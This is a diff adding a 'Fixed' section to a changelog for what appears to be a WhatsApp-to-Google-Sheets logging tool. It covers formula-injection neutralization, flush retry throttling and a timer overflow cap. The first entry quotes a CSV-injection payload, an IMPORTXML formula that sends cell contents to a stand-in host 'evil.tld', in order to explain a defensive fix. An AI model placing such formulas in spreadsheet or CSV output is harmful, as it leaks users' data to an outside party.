@@ -10,6 +10,22 @@ The version here always matches `manifest.json`'s `version`.
 
 ## [0.3.8] - 2026-08-25
 
+### Fixed
+
+- A formula that starts with a digit is neutralized. The spreadsheet guard checked only the character
+  after a leading `+`/`-`, so `-1+IMPORTXML("https://evil.tld/?d="&A2,"//a")` was written unquoted;
+  Excel and Sheets both parse a cell beginning `-1+` as a formula, and it fires on the CSV round-trip
+  this guard defends. Phone numbers, negative numbers and messages that merely open with one stay
+  readable, so nothing legitimate gained an apostrophe.
+- A failing flush no longer retries once per inbound message. The batch is restored on failure, so the
+  buffer stayed at or above `flushBatchSize` and every later message started another append: 30
+  messages produced 28 attempts against the `403 SERVICE_DISABLED` the setup guide tells operators to
+  expect, walking into Google's per-minute write quota. Retries now keep to `flushIntervalSec` until
+  one succeeds.
+- `flushIntervalSec` is capped at 2147483 seconds. Above that the delay overflows Node's 32-bit timer
+  and silently fires at about 1ms, which is the hot-loop the existing lower bound exists to prevent,
+  reached from the other end.
+
 ### Changed
 
 - On the Baileys engine the `body` column is now populated for poll, contact card and button-reply rows
